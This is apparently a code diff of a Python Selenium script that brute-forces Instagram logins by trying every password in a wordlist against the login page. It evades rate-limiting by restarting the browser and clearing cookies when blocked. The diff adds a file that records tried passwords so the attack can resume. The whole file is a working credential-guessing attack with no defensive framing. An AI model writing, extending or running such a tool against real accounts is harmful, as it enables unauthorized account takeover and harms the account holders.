@@ -8,6 +8,7 @@ delay = 0
 passwords = [ '666666' ]
 
 report_file = 'report.log'
+used_passwords_file = 'used_passes.txt'
 
 def login():
     driver.get('https://www.instagram.com/accounts/login/?force_classic_login')
@@ -32,25 +33,29 @@ def browser_config():
     return profile
 
 with open('wordlist.txt', 'r') as f:
-    profile = browser_config()
-    driver = webdriver.Firefox(profile)
     passwords = f.readlines()
 
 
-    report= open(report_file, 'wt')
-    for line in passwords:
-        password = line.rstrip()
-        login()
-        print "%s %s %s " % (time.strftime("%Y-%m-%d %H:%M"), driver.title, password)
-        report.write("%s %s \n" % (time.strftime("%Y-%m-%d %H:%M"), password))
+profile = browser_config()
+report = open(report_file, 'wt')
+used_passes = open(used_passwords_file, 'wt')
+driver = webdriver.Firefox(profile)
 
-        if 'Page Not Found' in driver.title:
-            while ('Page Not Found' in driver.title):
-                driver.close()
-                time.sleep(10)
-                driver = webdriver.Firefox()
-                driver.delete_all_cookies()
-                print "%s %s %s " % (time.strftime("%Y-%m-%d %H:%M"), driver.title, password)
-                report.write("%s %s \n" % (time.strftime("%Y-%m-%d %H:%M"), password))
-                login()
+for line in passwords:
+    password = line.rstrip()
+    login()
+    print "%s %s %s " % (time.strftime("%Y-%m-%d %H:%M"), driver.title, password)
+    report.write("%s %s \n" % (time.strftime("%Y-%m-%d %H:%M"), password))
+
+    if 'Page Not Found' in driver.title:
+        while ('Page Not Found' in driver.title):
+            driver.close()
+            time.sleep(10)
+            driver = webdriver.Firefox()
+            driver.delete_all_cookies()
+            print "%s %s %s " % (time.strftime("%Y-%m-%d %H:%M"), driver.title, password)
+            report.write("%s %s \n" % (time.strftime("%Y-%m-%d %H:%M"), password))
+            login()
+    used_passes.write("%s\n" % password)
 report.close()
+used_passes.close()
